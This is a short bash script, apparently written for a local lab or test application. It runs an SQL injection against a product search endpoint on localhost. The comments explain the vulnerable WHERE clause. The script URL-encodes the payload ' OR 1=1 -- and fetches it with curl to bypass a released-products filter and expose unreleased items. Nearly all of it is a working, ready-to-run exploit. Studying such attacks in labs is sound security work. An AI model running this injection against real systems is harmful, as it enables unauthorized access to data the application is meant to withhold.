#!/bin/bash

# SQL Injection Exploit - Get All Products (including unreleased)
# This exploits the /api/products/search endpoint to bypass the released=true filter

echo "=== SQL Injection: Get All Products ==="
echo ""

# The search endpoint has SQL injection in the WHERE clause:
# WHERE name ILIKE '%${q}%' AND released = true

# To bypass the released filter and get all products, we inject:
# ' OR 1=1 --
# This makes the query: WHERE name ILIKE '%%' OR 1=1 -- %' AND released = true
# The -- comments out the rest, so we get all products

PAYLOAD="' OR 1=1 --"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)

echo "Payload: $PAYLOAD"
echo "Encoded: $ENCODED_PAYLOAD"
echo ""

echo "Fetching all products (including unreleased)..."
curl -s "http://localhost:3001/api/products/search?q=${ENCODED_PAYLOAD}" | jq '.'

echo ""
echo "=== Exploit Complete ==="
